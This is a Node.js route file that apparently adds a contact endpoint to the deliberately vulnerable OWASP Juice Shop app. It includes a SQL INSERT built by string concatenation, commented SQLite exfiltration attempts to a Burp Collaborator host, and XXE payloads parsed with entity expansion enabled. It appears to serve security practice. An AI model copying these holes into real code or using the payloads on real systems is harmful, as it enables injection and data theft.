/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

//path: /api/contact-ag2r

const utils = require('../lib/utils')
const models = require('../models/index')
const fs = require('fs');
const libxmljs = require("libxmljs2");
const mysql = require('mysql');
const xml2js = require('xml2js');


function resolveAfter2Seconds() {
  return new Promise(resolve => {
    setTimeout(() => {
      resolve('apres le sqli');
    }, 2000);
  });
}

async function asyncCall(author, comment) {
  
  models.sequelize.query('SELECT * FROM contact_ag2rs WHERE author LIKE :search_name ',
    { replacements: { search_name: 'naruto'  }, type: models.sequelize.QueryTypes.SELECT }
  ).then(projects => {
    console.log(projects)
  })

  const result = await resolveAfter2Seconds()
  models.sequelize.query("INSERT INTO contact_ag2rs (author, comment) VALUES ('"+author+"', '"+comment+"');").then((result) => {

    /*
    //check the data have been save
    //models.sequelize.query('SELECT * FROM contact_ag2rs WHERE author = "'+author+'" order by id desc LIMIT 1').then(([data]) => {
    models.sequelize.query('select load_extension("//dsdsaaaddsd")').then(([data]) => {
    //models.sequelize.query("attach database '/net/rc752wcuose5e4m5ifm4nodmjdpdd2.burpcollaborator.net/z' as z;").then(([data]) => {
      const dataJson = utils.queryResultToJson(data)
      console.log(dataJson)
    })
    */

  }).catch(error => {
    console.log(error)
  })
}

async function asyncCallXml() {
  let payload = '<!DOCTYPE convert [ <!ENTITY remote SYSTEM "http://localhost:3000/rest/mass-assignment">%remote;]><dodo>remote;</dodo>'

  let parseString = require('xml2js').parseString;

  parseString(payload, {noent: true}, function (err, result) {
      console.log(result);
      if (err) {
        console.log(err)
      }
  });
}

module.exports = function contactPage () {
  return (req, res, next) => {
    var options = {
      noent: true,
      dtdload: false
    }

    //var payload = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://localhost:3000/rest/mass-assignment" >]><foo>&xxe;</foo>'

    //var payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://localhost:8000/">%xxe; ]><tutu>dd</tutu>'
    
    //var payload = '<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "http://localhost:8000">%remote;]><dodo>%remote;</dodo>'
  
    //var xmlDoc = libxmljs.parseXml(payload, options);
  
    //console.log(xmlDoc.toString());

    //asyncCall(req.body.author, req.body.comment)
    asyncCallXml()
    
    res.status(200).json({
        status: 'Working',
        data: {reponse: 'Data save, thanks'}
      })
  }
}
